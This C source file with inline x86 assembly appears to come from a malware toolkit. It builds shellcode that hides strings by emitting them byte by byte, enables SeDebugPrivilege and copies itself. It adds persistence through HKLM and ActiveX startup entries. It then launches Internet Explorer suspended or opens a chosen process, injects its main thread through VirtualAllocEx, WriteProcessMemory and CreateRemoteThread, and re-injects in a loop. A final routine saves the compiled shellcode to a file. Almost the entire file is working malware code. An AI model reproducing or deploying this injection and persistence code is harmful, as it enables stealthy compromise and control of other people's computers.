#include "shellcodes.h"
#include "global_data.h"

#ifndef _WIN64

#pragma optimize("ts", on)

void __stdcall inject_to_explorer_code_x86(explorer_thread_param_t *param) {
  global_data_t *global_data = &param->global_data;

  // 等待几秒钟让loader退出
  global_data->xSleep(1000 * 2);
  HANDLE mutex_handle = global_data->xCreateMutexA(0, false, global_data->mutex_name);
  if (mutex_handle == 0) return;

  if (global_data->xGetLastError() == ERROR_ALREADY_EXISTS) {
    global_data->xCloseHandle(mutex_handle);
    return;
  }

  wchar_t *expand_str = 0;
  char *sedebugname = 0;

  __asm {
    call push_str
      __emit('%')
      __emit(0)
      __emit('P')
      __emit(0)
      __emit('R')
      __emit(0)
      __emit('O')
      __emit(0)
      __emit('G')
      __emit(0)
      __emit('R')
      __emit(0)
      __emit('A')
      __emit(0)
      __emit('M')
      __emit(0)
      __emit('F')
      __emit(0)
      __emit('I')
      __emit(0)
      __emit('L')
      __emit(0)
      __emit('E')
      __emit(0)
      __emit('S')
      __emit(0)
      __emit('%')
      __emit(0)
      __emit('\\')
      __emit(0)
      __emit('I')
      __emit(0)
      __emit('n')
      __emit(0)
      __emit('t')
      __emit(0)
      __emit('e')
      __emit(0)
      __emit('r')
      __emit(0)
      __emit('n')
      __emit(0)
      __emit('e')
      __emit(0)
      __emit('t')
      __emit(0)
      __emit(' ')
      __emit(0)
      __emit('E')
      __emit(0)
      __emit('x')
      __emit(0)
      __emit('p')
      __emit(0)
      __emit('l')
      __emit(0)
      __emit('o')
      __emit(0)
      __emit('r')
      __emit(0)
      __emit('e')
      __emit(0)
      __emit('r')
      __emit(0)
      __emit('\\')
      __emit(0)
      __emit('i')
      __emit(0)
      __emit('e')
      __emit(0)
      __emit('x')
      __emit(0)
      __emit('p')
      __emit(0)
      __emit('l')
      __emit(0)
      __emit('o')
      __emit(0)
      __emit('r')
      __emit(0)
      __emit('e')
      __emit(0)
      __emit('.')
      __emit(0)
      __emit('e')
      __emit(0)
      __emit('x')
      __emit(0)
      __emit('e')
      __emit(0)
      __emit(0)
      __emit(0)
    push_str:
    pop eax
      mov expand_str, eax
      call push_str_1
      __emit('S')
      __emit('e')
      __emit('D')
      __emit('e')
      __emit('b')
      __emit('u')
      __emit('g')
      __emit('P')
      __emit('r')
      __emit('i')
      __emit('v')
      __emit('i')
      __emit('l')
      __emit('e')
      __emit('g')
      __emit('e')
      __emit(0)
    push_str_1:
    pop eax
      mov sedebugname, eax
  }

  HANDLE token;
  TOKEN_PRIVILEGES tkp;

  if (!global_data->xOpenProcessToken(global_data->xGetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token)) return;

  if (!global_data->xLookupPrivilegeValueA(NULL, sedebugname, &tkp.Privileges[0].Luid)) {
    global_data->xCloseHandle(token);
    return;
  }

  tkp.PrivilegeCount = 1;
  tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
  if (!global_data->xAdjustTokenPrivileges(token, FALSE, &tkp, sizeof(tkp), NULL, NULL)) {
    global_data->xCloseHandle(token);
    return;
  }

  if (global_data->copy_method != COPY_METHOD_NONE) {
    global_data->copy_self_x86(global_data);
  }

  if (global_data->startup_hklm) {
    global_data->add_startup_hklm_x86(global_data);
  }

  if (global_data->startup_acitvex) {
    global_data->add_startup_activex_x86(global_data);
  }

  wchar_t ie_path[MAX_PATH];

  u32 ret = global_data->xExpandEnvironmentStringsW(expand_str, ie_path, MAX_PATH);
  ie_path[ret] = 0;

  HANDLE heap = global_data->xGetProcessHeap();
  global_data_t *new_global_data = global_data->xHeapAlloc(heap, HEAP_ZERO_MEMORY, sizeof(global_data_t));

  for (;;) {
    HANDLE process = 0;

    if (global_data->inject_to_custom) {
      for (u32 i = 0; i < INJECT_TIMES; i++) {
        global_data->xSleep(INJECT_INTERVAL);
        u32 pid = global_data->find_process_by_name_x86(global_data, global_data->custom_process_name);
        if (pid != 0) {
          process = global_data->xOpenProcess(PROCESS_ALL_ACCESS, false, pid);
          if (process != 0) break;
        }
      }
    }

    // 注入到ie
    if (process == 0) {
      STARTUPINFOW si;
      PROCESS_INFORMATION pi;

      global_data->xRtlZeroMemory(&si, sizeof(si));
      global_data->xRtlZeroMemory(&pi, sizeof(pi));

      si.cb = sizeof(si);
      si.wShowWindow = SW_SHOWNORMAL;

      if (!global_data->xCreateProcessW(0, ie_path, 0, 0, false, CREATE_SUSPENDED | DETACHED_PROCESS, 0, 0, &si, &pi)) continue;

      global_data->xCloseHandle(pi.hThread);
      process = pi.hProcess;
    }

    global_data->xRtlZeroMemory(new_global_data, sizeof(global_data_t));
    global_data->xRtlMoveMemory(new_global_data, global_data, sizeof(global_data_t));

    // 修复global_data extrac函数
    extra_function_t *extrac_function = &new_global_data->connect_by_socks5;
    void *temp = 0;

    for (u32 i = 0; i < 15; i++) {
      if (extrac_function->ptr64 != 0) {
        temp = global_data->xVirtualAllocEx(process, 0, extrac_function->size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if (temp == 0) break;
        if (!global_data->xWriteProcessMemory(process, temp, (void *)extrac_function->ptr32, extrac_function->size, 0)) break;
        extrac_function->ptr64 = (u64)temp;
      }
    }
    if (temp == 0) continue;

    void *remote_thread, *remote_param;

    remote_thread = global_data->xVirtualAllocEx(process, 0, param->thread_main_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    remote_param = global_data->xVirtualAllocEx(process, 0, sizeof(global_data_t), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (remote_thread == 0 || remote_param == 0) continue;

    if (!global_data->xWriteProcessMemory(process, remote_thread, (void *)param->thread_main, param->thread_main_size, 0)) continue;
    if (!global_data->xWriteProcessMemory(process, remote_param, new_global_data, sizeof(global_data_t), 0)) continue;

    HANDLE thread = global_data->xCreateRemoteThread(process, 0, 0, (LPTHREAD_START_ROUTINE)remote_thread, remote_param, 0, 0);
    if (thread == 0) continue;
    
    global_data->xCloseHandle(process);

    if (global_data->persistence) {
      global_data->xWaitForSingleObject(thread, INFINITE);
      global_data->xCloseHandle(thread);
    }
    else {
      global_data->xCloseHandle(thread);
      break;
    }
  }

  global_data->xHeapFree(heap, 0, new_global_data);
}

void inject_to_explorer_code_x86_end() {
  printf(__FUNCTION__);
}

#pragma optimize("ts", off)

void inject_to_explorer_code_x86_save(const char *filename) {
  char *start, *end;
  FILE *f;

  start = (char *)inject_to_explorer_code_x86;
  end = (char *)inject_to_explorer_code_x86_end;

  printf("[*] inject_to_explorer_code_x86 code size = 0x%X\n", end - start);

  f = fopen(filename, "wb");

  u16 temp = offsetof(global_data_t, inject_to_explorer_code_x86);
  printf("offset: 0x%X\n", temp);

  fwrite(&temp, 1, sizeof(temp), f);

  temp = end - start;
  fwrite(&temp, 1, sizeof(temp), f);

  fwrite(start, 1, end - start, f);

  fclose(f);

  printf("[*] save inject_to_explorer_code_x86 to %s success.\n", filename);
}

#endif